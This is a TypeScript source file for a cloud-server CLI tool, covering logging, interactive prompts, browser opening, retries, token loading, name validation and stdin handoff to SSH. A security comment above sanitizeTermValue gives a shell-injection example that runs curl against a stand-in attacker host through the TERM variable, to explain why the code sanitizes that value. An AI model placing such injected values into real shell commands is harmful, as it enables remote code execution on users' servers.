// shared/ui.ts — Logging, prompts, and browser opening
// @clack/prompts is bundled into cli.js at build time.

import { readFileSync } from "node:fs";
import * as p from "@clack/prompts";
import { getSpawnCloudConfigPath } from "./paths";
import { isString } from "./type-guards";

const RED = "\x1b[0;31m";
const GREEN = "\x1b[0;32m";
const YELLOW = "\x1b[1;33m";
const CYAN = "\x1b[0;36m";
const DIM = "\x1b[2m";
const NC = "\x1b[0m";

export function logInfo(msg: string): void {
  process.stderr.write(`${GREEN}${msg}${NC}\n`);
}

/** Log a debug message to stderr (dim text). Only visible when SPAWN_DEBUG=1. */
export function logDebug(msg: string): void {
  if (process.env.SPAWN_DEBUG === "1") {
    process.stderr.write(`${DIM}[debug] ${msg}${NC}\n`);
  }
}

export function logWarn(msg: string): void {
  process.stderr.write(`${YELLOW}${msg}${NC}\n`);
}

export function logError(msg: string): void {
  process.stderr.write(`${RED}${msg}${NC}\n`);
}

export function logStep(msg: string): void {
  process.stderr.write(`${CYAN}${msg}${NC}\n`);
}

/** Overwrite the current line with a status message (no newline). Call logStepDone() when finished. */
export function logStepInline(msg: string): void {
  process.stderr.write(`\r${CYAN}${msg}${NC}\x1b[K`);
}

/** End an inline status line by moving to the next line. */
export function logStepDone(): void {
  process.stderr.write("\r\x1b[K");
}

/** Prompt for a line of user input. Throws if non-interactive.
 *  Uses @clack/prompts instead of Node readline to avoid Bun #1707
 *  where readline interfaces silently close after @clack/prompts runs
 *  (e.g., SSH key multiselect kills subsequent readline prompts).
 *  Rejects if stdin closes unexpectedly (e.g., post-clack state corruption)
 *  instead of hanging forever. */
export async function prompt(question: string): Promise<string> {
  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
    throw new Error("Cannot prompt: SPAWN_NON_INTERACTIVE is set");
  }
  // Strip trailing ": " or ":" since clack adds its own formatting
  const message = question.replace(/:\s*$/, "").trim();

  // Race the prompt against stdin closing unexpectedly.
  // If stdin dies (e.g., after @clack/prompts corrupts its state),
  // the close listener rejects so we don't hang forever.
  let cleanupStdinListener: (() => void) | undefined;
  const stdinClosePromise = new Promise<never>((_resolve, reject) => {
    const onClose = () => {
      reject(new Error("stdin closed unexpectedly during prompt"));
    };
    process.stdin.once("close", onClose);
    cleanupStdinListener = () => {
      process.stdin.removeListener("close", onClose);
    };
  });

  try {
    const result = await Promise.race([
      p.text({
        message,
      }),
      stdinClosePromise,
    ]);
    return p.isCancel(result) ? "" : (result || "").trim();
  } finally {
    cleanupStdinListener?.();
  }
}

/**
 * Display an interactive select from pipe-delimited items.
 * Items format: "id|label" per line.
 * Uses @clack/prompts when available (local checkout), falls back to numbered list.
 * Returns the selected id.
 */
export async function selectFromList(items: string[], promptText: string, defaultValue: string): Promise<string> {
  if (items.length === 0) {
    return defaultValue;
  }

  const parsed = items.map((line) => {
    const parts = line.split("|");
    return {
      id: parts[0],
      label: parts.slice(1).join(" — "),
    };
  });

  if (parsed.length === 1) {
    logInfo(`Using ${promptText}: ${parsed[0].id}`);
    return parsed[0].id;
  }

  const result = await p.select({
    message: `Select ${promptText}`,
    options: parsed.map((item) => ({
      value: item.id,
      label: item.id,
      hint: item.label,
    })),
    initialValue: defaultValue,
  });

  if (p.isCancel(result)) {
    return defaultValue;
  }
  return isString(result) ? result : String(result);
}

/** Open a URL in the user's browser. */
export function openBrowser(url: string): void {
  const cmds: [
    string,
    string[],
  ][] =
    process.platform === "darwin"
      ? [
          [
            "open",
            [
              url,
            ],
          ],
        ]
      : [
          [
            "xdg-open",
            [
              url,
            ],
          ],
          [
            "termux-open-url",
            [
              url,
            ],
          ],
        ];

  let opened = false;
  for (const [cmd, args] of cmds) {
    try {
      const result = Bun.spawnSync(
        [
          cmd,
          ...args,
        ],
        {
          stdio: [
            "ignore",
            "ignore",
            "ignore",
          ],
        },
      );
      if (result.exitCode === 0) {
        opened = true;
        break;
      }
    } catch {
      // command not found or failed to spawn — try next
    }
  }

  // Always show the URL as fallback (headless VMs, VNC, SSH sessions)
  if (opened) {
    logStep(`If the browser didn't open, visit: ${url}`);
  } else {
    logStep(`Please open: ${url}`);
  }
}

// ─── Result-based retry ────────────────────────────────────────────────

import type { Result } from "./result";

export { Err, Ok, type Result } from "./result";

/**
 * Phase-aware retry helper using the Result monad.
 *
 * - `fn` returns `Ok(value)` on success — stops retrying, returns `value`.
 * - `fn` returns `Err(error)` on a retryable failure — retries up to `maxAttempts`.
 * - `fn` **throws** on a non-retryable failure — immediately propagates (no retry).
 *
 * This lets each caller decide at the point of failure whether the error is
 * retryable (return Err) or fatal (throw), instead of relying on brittle
 * error-message pattern matching after the fact.
 */
export async function withRetry<T>(
  label: string,
  fn: () => Promise<Result<T>>,
  maxAttempts = 3,
  delaySec = 5,
): Promise<T> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const result = await fn(); // throws → not retried (non-retryable)
    if (result.ok) {
      return result.data;
    }
    if (attempt >= maxAttempts) {
      throw result.error;
    }
    logWarn(`${label} failed (attempt ${attempt}/${maxAttempts}), retrying in ${delaySec}s...`);
    await new Promise((r) => setTimeout(r, delaySec * 1000));
  }
  throw new Error("unreachable");
}

/**
 * Load an API token from the per-cloud config file.
 * Reads `api_key` or `token` field and validates allowed characters.
 * Returns null if the file is missing, unreadable, or the token is invalid.
 */
export function loadApiToken(cloud: string): string | null {
  try {
    const data = JSON.parse(readFileSync(getSpawnCloudConfigPath(cloud), "utf-8"));
    const token = (isString(data.api_key) ? data.api_key : "") || (isString(data.token) ? data.token : "");
    if (!token) {
      return null;
    }
    if (!/^[a-zA-Z0-9._/@:+=, -]+$/.test(token)) {
      return null;
    }
    return token;
  } catch {
    return null;
  }
}

/** JSON-escape a string (returns the quoted JSON string). */
export function jsonEscape(s: string): string {
  return JSON.stringify(s);
}

/** Validate server name: 3-63 chars, alphanumeric + dash, no leading/trailing dash. */
export function validateServerName(name: string): boolean {
  if (name.length < 3 || name.length > 63) {
    return false;
  }
  if (!/^[a-zA-Z0-9-]+$/.test(name)) {
    return false;
  }
  if (name.startsWith("-") || name.endsWith("-")) {
    return false;
  }
  return true;
}

/** Validate region name: 1-63 chars, alphanumeric + dash + underscore. */
export function validateRegionName(region: string): boolean {
  return /^[a-zA-Z0-9_-]{1,63}$/.test(region);
}

/** Convert display name to kebab-case. */
export function toKebabCase(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9-]/g, "-")
    .replace(/-{2,}/g, "-")
    .replace(/^-|-$/g, "");
}

/** Generate a default spawn name with random suffix (e.g. "spawn-a1b2"). */
export function defaultSpawnName(): string {
  const suffix = Math.random().toString(36).slice(2, 6);
  return `spawn-${suffix}`;
}

/**
 * Get server name from a cloud-specific env var, falling back to SPAWN_NAME_KEBAB / defaultSpawnName.
 * Every cloud module had an identical copy of this logic — now unified here.
 */
export function getServerNameFromEnv(cloudEnvVar: string): string {
  const cloudName = process.env[cloudEnvVar];
  if (cloudName) {
    if (!validateServerName(cloudName)) {
      logError(`Invalid ${cloudEnvVar}: '${cloudName}'`);
      throw new Error("Invalid server name");
    }
    logInfo(`Using server name from environment: ${cloudName}`);
    return cloudName;
  }

  const kebab = process.env.SPAWN_NAME_KEBAB || (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "");
  return kebab || defaultSpawnName();
}

/**
 * Prompt user for a spawn name (or derive it non-interactively).
 * Every cloud module had an identical copy of this logic — now unified here.
 *
 * @param cloudLabel - Display label for the prompt (e.g. "AWS instance", "Hetzner server")
 */
export async function promptSpawnNameShared(cloudLabel: string): Promise<void> {
  if (process.env.SPAWN_NAME_KEBAB) {
    return;
  }

  let kebab: string;
  if (process.env.SPAWN_NON_INTERACTIVE === "1") {
    kebab = (process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "") || defaultSpawnName();
  } else {
    const derived = process.env.SPAWN_NAME ? toKebabCase(process.env.SPAWN_NAME) : "";
    const fallback = derived || defaultSpawnName();
    process.stderr.write("\n");
    const answer = await prompt(`${cloudLabel} name [${fallback}]: `);
    kebab = toKebabCase(answer || fallback) || defaultSpawnName();
  }

  process.env.SPAWN_NAME_DISPLAY = kebab;
  process.env.SPAWN_NAME_KEBAB = kebab;
  logInfo(`Using resource name: ${kebab}`);
}

/** Sanitize TERM value before interpolating into shell commands.
 *  SECURITY: Prevents shell injection via malicious TERM env vars
 *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
export function sanitizeTermValue(term: string): string {
  if (/^[a-zA-Z0-9._-]+$/.test(term)) {
    return term;
  }
  return "xterm-256color";
}

/** Prepare stdin for clean handoff to an interactive child process.
 *  Removes listeners and resets raw mode so fd 0 is clean.
 *
 *  NOTE: Do NOT call process.stdin.destroy() here — it can corrupt fd 0
 *  so the child process (SSH) inherits a broken file descriptor.
 *  Do NOT call stty sane — it enables ixon (XON/XOFF flow control) which
 *  SSH may not fully override, causing periodic input pauses.
 *
 *  The interactive session uses spawnSync which blocks the event loop,
 *  so there's no fd 0 competition regardless of stream state. */
export function prepareStdinForHandoff(): void {
  // Remove any leftover keypress/data listeners (from @clack/prompts, readline, etc.)
  process.stdin.removeAllListeners();

  // Reset raw mode so the terminal is in cooked mode before SSH takes over.
  // SSH will set its own terminal mode when it starts.
  if (process.stdin.isTTY) {
    try {
      process.stdin.setRawMode(false);
    } catch {
      // ignore — not a TTY or already closed
    }
  }

  // Stop the stream from reading, but do NOT destroy it (that can close fd 0).
  // Do NOT call unref() here — it allows the event loop to exit before an
  // async child process (spawnBash) finishes. The spawnInteractive path uses
  // spawnSync so the event loop is already blocked.
  process.stdin.pause();
}
